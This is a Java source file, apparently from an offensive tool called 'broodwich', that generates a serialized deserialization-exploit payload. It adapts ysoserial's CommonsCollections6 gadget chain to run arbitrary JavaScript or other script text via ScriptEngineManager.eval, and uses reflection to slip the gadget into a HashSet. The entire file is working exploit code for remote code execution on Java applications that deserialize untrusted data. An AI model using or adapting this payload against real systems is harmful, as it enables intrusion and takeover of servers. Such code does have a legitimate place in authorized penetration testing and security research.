package party.itistimeto.broodwich.deserialization;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.script.ScriptEngineManager;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

// based on pop chain in https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java

public class CommonsCollectionsThreePayload implements ScriptEngineEvaluator {
    @Override
    public byte[] generateScriptPayload(String scriptText, String scriptType) {
        Transformer conTr = ConstantTransformer.getInstance(ScriptEngineManager.class);
        Transformer insTr = InstantiateTransformer.getInstance(new Class[]{}, new Object[]{});
        Transformer engTr = InvokerTransformer.getInstance("getEngineByExtension", new Class[]{String.class}, new Object[]{scriptType});
        Transformer evaTr = InvokerTransformer.getInstance("eval", new Class[]{String.class}, new Object[]{scriptText});
        Transformer dumTr = ConstantTransformer.getInstance("athf");
        Transformer chaTr = ChainedTransformer.getInstance(new Transformer[]{conTr, insTr, engTr, evaTr, dumTr});

        Map lm = LazyMap.decorate(new HashMap<>(), chaTr);
        TiedMapEntry tm = new TiedMapEntry(lm, "athf");
        // note: if you set a breakpoint after this in debugger, debugger will read lazymap and serialization won't work
        Set<Object> s = new HashSet<>();
        s.add("athf");

        HashMap backingMap = (HashMap) Util.getField(s, "map");
        Object[] backingArr = (Object[]) Util.getField(backingMap, "table");
        for(int i = 0; i < backingArr.length; i++)
        {
            if(backingArr[i] != null) {
                Util.setField(backingArr[i], "key", tm);
                break;
            }
        }

        return Util.serialize(s);
    }

    @Override
    public byte[] generateJavaScriptPayload(String scriptText) {
        return generateScriptPayload(scriptText, "js");
    }
}
